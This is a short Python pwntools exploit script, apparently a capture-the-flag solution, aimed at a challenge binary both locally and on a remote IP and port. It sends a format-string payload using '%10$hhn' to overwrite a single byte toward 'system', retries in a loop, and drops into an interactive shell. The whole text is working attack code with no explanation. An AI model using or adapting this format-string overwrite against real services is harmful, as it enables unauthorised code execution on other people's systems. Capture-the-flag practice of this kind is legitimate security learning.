from pwn import *

debug = 0
while (True):
	if (debug):
		p = process("./chall")
	else:
		p = remote("52.14.152.164", "10002")

	system = 0x70

	payload = "%"+str(system)+"c%10$hhn\x00"
	payload += "\x08" * (0x21 - len(payload))

	p.send(payload)

	p.interactive()